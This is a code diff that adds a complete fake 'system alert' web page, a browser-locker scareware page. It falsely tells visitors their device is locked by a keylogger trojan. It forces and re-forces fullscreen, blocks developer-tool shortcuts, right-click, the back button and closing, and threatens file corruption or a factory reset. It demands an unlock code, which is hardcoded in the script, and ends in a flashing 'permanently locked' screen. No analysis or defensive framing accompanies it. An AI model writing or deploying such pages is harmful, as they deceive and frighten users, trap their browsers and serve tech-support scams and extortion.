@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification Required</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            overflow: hidden;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .warning {
+            background: #111;
+            padding: 30px;
+            border-radius: 15px;
+            border: 3px solid #ff0000;
+            box-shadow: 0 0 50px rgba(255, 0, 0, 0.5);
+            max-width: 95%;
+        }
+        
+        h1 {
+            color: #ff0000;
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+        
+        p {
+            margin: 15px 0;
+            line-height: 1.6;
+            font-size: 16px;
+        }
+        
+        .code-input {
+            margin: 25px 0;
+        }
+        
+        input {
+            width: 200px;
+            padding: 15px;
+            font-size: 20px;
+            text-align: center;
+            background: #222;
+            color: #0f0;
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            letter-spacing: 5px;
+            font-weight: bold;
+        }
+        
+        button {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+            width: 200px;
+        }
+        
+        button:hover {
+            background: #cc0000;
+        }
+        
+        .timer {
+            font-size: 14px;
+            color: #ff9900;
+            margin-top: 20px;
+        }
+        
+        .fake-popup {
+            background: #222;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 5px solid #ff9900;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h1>⚠️ SYSTEM ALERT ⚠️</h1>
+        
+        <div class="fake-popup">
+            <p><strong>Security Breach Detected!</strong></p>
+            <p>Your device has been locked due to suspicious activity.</p>
+        </div>
+        
+        <p>Malicious software detected: <strong>Trojan:Win32/Keylogger</strong></p>
+        <p>All data transmission has been halted for security.</p>
+        
+        <div class="code-input">
+            <p>Enter security code to unlock:</p>
+            <input type="text" id="codeInput" maxlength="6" placeholder="000000" autocomplete="off">
+            <br>
+            <button onclick="checkCode()">UNLOCK DEVICE</button>
+        </div>
+        
+        <p class="timer" id="timer">Attempts remaining: <span id="attempts">5</span></p>
+        
+        <div class="fake-popup">
+            <p><strong>Note:</strong> Closing this page will trigger factory reset.</p>
+        </div>
+    </div>
+
+    <script>
+        // BLOCK ALL ESCAPE METHODS
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        document.onkeydown = function(e) {
+            // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S, etc.
+            if (e.keyCode == 123 || // F12
+                (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+                (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+                (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+                (e.ctrlKey && e.keyCode == 83) || // Ctrl+S
+                (e.ctrlKey && e.keyCode == 80) || // Ctrl+P
+                (e.keyCode == 116) // F5
+            ) {
+                alert('Security restriction active!');
+                return false;
+            }
+        };
+
+        // FULLSCREEN LOCK
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) { // Safari
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) { // IE11
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // PREVENT EXIT FULLSCREEN
+        document.addEventListener('fullscreenchange', exitHandler);
+        document.addEventListener('webkitfullscreenchange', exitHandler);
+        document.addEventListener('mozfullscreenchange', exitHandler);
+        document.addEventListener('MSFullscreenChange', exitHandler);
+
+        function exitHandler() {
+            if (!document.fullscreenElement &&
+                !document.webkitFullscreenElement &&
+                !document.mozFullScreenElement &&
+                !document.msFullscreenElement) {
+                // User exited fullscreen, force it back
+                requestFullscreen();
+                alert('Do not attempt to exit fullscreen mode!');
+            }
+        }
+
+        // BLOCK BACK BUTTON
+        history.pushState(null, null, location.href);
+        window.onpopstate = function(event) {
+            history.go(1);
+            alert('Back navigation disabled!');
+        };
+
+        // PREVENT WINDOW CLOSE
+        window.onbeforeunload = function(e) {
+            e = e || window.event;
+            // For old browsers
+            if (e) {
+                e.returnValue = '⚠️ WARNING: Closing this page will corrupt system files!';
+            }
+            return '⚠️ WARNING: Closing this page will corrupt system files!';
+        };
+
+        // SECURITY CODE CHECK
+        let attempts = 5;
+        const correctCode = "642012";
+
+        function checkCode() {
+            const input = document.getElementById('codeInput').value;
+            const attemptDisplay = document.getElementById('attempts');
+            
+            if (input === correctCode) {
+                // CORRECT CODE - UNLOCK
+                alert('✅ Security code accepted. Device unlocked.');
+                
+                // Exit fullscreen
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                }
+                
+                // Redirect to safe page
+                window.location.href = "https://google.com";
+                return;
+            }
+            
+            // WRONG CODE
+            attempts--;
+            attemptDisplay.textContent = attempts;
+            
+            if (attempts <= 0) {
+                // NO MORE ATTEMPTS - HARD LOCK
+                document.body.innerHTML = `
+                    <div style="background:#000;color:#ff0000;height:100vh;display:flex;justify-content:center;align-items:center;text-align:center;padding:20px;">
+                        <div>
+                            <h1 style="font-size:40px;">🔒 PERMANENTLY LOCKED 🔒</h1>
+                            <p style="font-size:20px;margin:20px 0;">Maximum attempts exceeded.</p>
+                            <p>Contact system administrator.</p>
+                            <p style="margin-top:30px;font-size:12px;color:#666;">ID: LOCK_${Date.now()}</p>
+                        </div>
+                    </div>
+                `;
+                
+                // Disable input
+                document.getElementById('codeInput').disabled = true;
+                document.querySelector('button').disabled = true;
+                
+                // Start annoying loop
+                setInterval(() => {
+                    document.body.style.backgroundColor = 
+                        document.body.style.backgroundColor === '#000' ? '#ff0000' : '#000';
+                }, 500);
+                
+                return;
+            }
+            
+            // Wrong code but still have attempts
+            alert(`❌ Invalid code! Attempts remaining: ${attempts}`);
+            document.getElementById('codeInput').value = '';
+            document.getElementById('codeInput').style.borderColor = '#ff0000';
+            
+            // Shake effect
+            document.querySelector('.code-input').style.animation = 'shake 0.5s';
+            setTimeout(() => {
+                document.querySelector('.code-input').style.animation = '';
+            }, 500);
+        }
+
+        // INITIALIZE
+        window.onload = function() {
+            requestFullscreen();
+            
+            // Auto-focus input
+            document.getElementById('codeInput').focus();
+            
+            // Add CSS for shake animation
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes shake {
+                    0%, 100% {transform: translateX(0);}
+                    10%, 30%, 50%, 70%, 90% {transform: translateX(-5px);}
+                    20%, 40%, 60%, 80% {transform: translateX(5px);}
+                }
+            `;
+            document.head.appendChild(style);
+            
+            // Prevent sleep
+            let preventSleep = function() {
+                // Play silent audio to prevent sleep
+                const audio = new Audio();
+                audio.src = "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEAQB8AAEAfAAABAAgAZGF0YQ";
+                audio.volume = 0.01;
+                audio.play();
+            };
+            setInterval(preventSleep, 30000); // Every 30 seconds
+        };
+    </script>
+</body>
+</html>
